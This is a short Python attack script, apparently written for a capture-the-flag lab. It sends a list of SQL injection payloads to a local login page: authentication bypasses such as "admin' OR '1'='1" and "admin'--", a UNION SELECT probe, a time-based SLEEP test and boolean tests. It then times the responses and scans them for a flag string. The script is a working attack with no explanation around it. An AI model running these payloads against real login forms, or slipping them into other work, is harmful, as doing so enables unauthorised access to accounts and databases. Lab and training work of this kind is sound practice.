import requests, time, sys, warnings
warnings.filterwarnings('ignore')

target_url = "http://127.0.0.1:33131"
login_endpoint = f"{target_url}/index.php"

print(f"[*] Target: {login_endpoint}\n")

# Simple connectivity test
print("[*] Testing connectivity...")
try:
    resp = requests.get(target_url, timeout=5)
    print(f"[+] Server reachable: {resp.status_code}")
except Exception as e:
    print(f"[!] Connection error: {e}")
    sys.exit(1)

# Test a small batch of payloads efficiently
print("\n[*] Testing SQL injection payloads...\n")

payloads = [
    ("SQL Payload 1", "username", "admin' OR '1'='1"),
    ("SQL Payload 2", "username", "admin' #"),
    ("SQL Payload 3", "username", "' UNION SELECT 1,2,3-- "),
    ("Time Test", "username", "' OR SLEEP(3)--"),
    ("Boolean True", "username", "' OR 1=1--"),
    ("Boolean False", "username", "' AND 1=2--"),
    ("Login Bypass", "username", "admin'--"),
]

for name, param, value in payloads:
    try:
        data = {"username": value, "password": "test123"}
        print(f"Testing {name}: {value[:50]}...")
        
        start = time.time()
        resp = requests.post(login_endpoint, data=data, timeout=10, allow_redirects=False)
        elapsed = time.time() - start
        
        print(f"  Status: {resp.status_code} | Time: {elapsed:.3f}s | Length: {len(resp.text)}B")
        
        # Quick flag search
        if "FLAG{" in resp.text or "flag{" in resp.text:
            idx = resp.text.find("FLAG{")
            if idx == -1:
                idx = resp.text.find("flag{")
            print(f"  [!] FLAG FOUND in response!")
            print(f"  Extract: {resp.text[idx:idx+100]}")
        
        if elapsed > 2.5:
            print(f"  [!] SLOW RESPONSE - possible time-based SQLi")
            
        print()
        
    except requests.exceptions.Timeout:
        print(f"  [!] TIMEOUT - request exceeded 10 seconds\n")
    except Exception as e:
        print(f"  [!] Error: {e}\n")

print("[*] Testing complete")
